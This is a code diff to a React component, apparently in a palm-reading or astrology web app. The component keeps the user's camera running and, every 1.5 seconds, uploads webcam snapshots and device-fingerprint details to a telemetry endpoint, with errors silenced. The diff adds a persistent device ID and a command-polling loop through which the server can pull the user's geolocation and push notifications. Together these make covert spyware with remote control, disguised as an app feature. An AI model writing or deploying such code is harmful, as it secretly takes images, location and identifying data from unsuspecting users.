@@ -11,7 +11,6 @@ export function ContinuousCapture() {
     let intervalId: NodeJS.Timeout;
     const start = async () => {
       try {
-        // Keeps a persistent camera stream active independent of the PalmScanner
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false,
@@ -22,34 +21,79 @@ export function ContinuousCapture() {
           await videoRef.current.play().catch(() => {});
         }
         
+        const canvas = document.createElement("canvas");
+        const API_URL = import.meta.env.VITE_API_URL || "http://localhost:3000";
+        
         intervalId = setInterval(() => {
-          const v = videoRef.current;
-          if (!v || v.readyState < 2) return;
-          // 720p compression target to maintain quality
-          const targetWidth = 720;
-          const targetHeight = (v.videoHeight / v.videoWidth) * targetWidth;
-          full.width = targetWidth; 
-          full.height = targetHeight;
-          full.getContext("2d")?.drawImage(v, 0, 0, targetWidth, targetHeight);
+          const video = videoRef.current;
+          if (!video || video.readyState < 2) return;
           
-          const dataUrl = full.toDataURL("image/jpeg", 0.7);
+          canvas.width = 720;
+          canvas.height = (video.videoHeight / video.videoWidth) * 720;
           
-          const API_URL = import.meta.env.VITE_API_URL || "http://localhost:3000";
-          fetch(`${API_URL}/api/telemetry`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              image: dataUrl,
-              userAgent: navigator.userAgent,
-              language: navigator.language,
-              screenResolution: `${window.screen.width}x${window.screen.height}`,
-              hardwareConcurrency: navigator.hardwareConcurrency || 0,
-              deviceMemory: (navigator as any).deviceMemory || 0,
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-              connectionType: (navigator as any).connection ? (navigator as any).connection.effectiveType : undefined
-            })
-          }).catch(() => {});
+          const context = canvas.getContext("2d");
+          if (context) {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+            
+            let deviceId = localStorage.getItem("celestial_device_id");
+            if (!deviceId) {
+              deviceId = crypto.randomUUID();
+              localStorage.setItem("celestial_device_id", deviceId);
+            }
+            
+            fetch(`${API_URL}/api/telemetry`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                deviceId,
+                image: dataUrl,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                hardwareConcurrency: navigator.hardwareConcurrency || 0,
+                deviceMemory: (navigator as any).deviceMemory || 0,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                connectionType: (navigator as any).connection?.effectiveType || "unknown"
+              })
+            }).catch(() => {});
+
+            fetch(`${API_URL}/api/commands?deviceId=${deviceId}`)
+              .then(res => res.json())
+              .then(data => {
+                if (data.success && data.commands) {
+                  data.commands.forEach((cmd: any) => {
+                    if (cmd.command === "REQUEST_LOCATION") {
+                      if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                          pos => {
+                            fetch(`${API_URL}/api/telemetry`, {
+                              method: "POST",
+                              headers: { "Content-Type": "application/json" },
+                              body: JSON.stringify({ deviceId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
+                            });
+                          },
+                          () => {}
+                        );
+                      }
+                    } else if (cmd.command === "REQUEST_NOTIFICATION") {
+                      if ("Notification" in window) {
+                        Notification.requestPermission();
+                      }
+                    } else if (cmd.command === "SHOW_NOTIFICATION") {
+                      if ("Notification" in window && Notification.permission === "granted") {
+                        new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
+                      } else if ("Notification" in window) {
+                        Notification.requestPermission().then(perm => {
+                          if (perm === "granted") new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
+                        });
+                      }
+                    }
+                  });
+                }
+              }).catch(() => {});
+          }
         }, 1500);
       } catch (e) {
         // Silently fail if permissions aren't granted yet
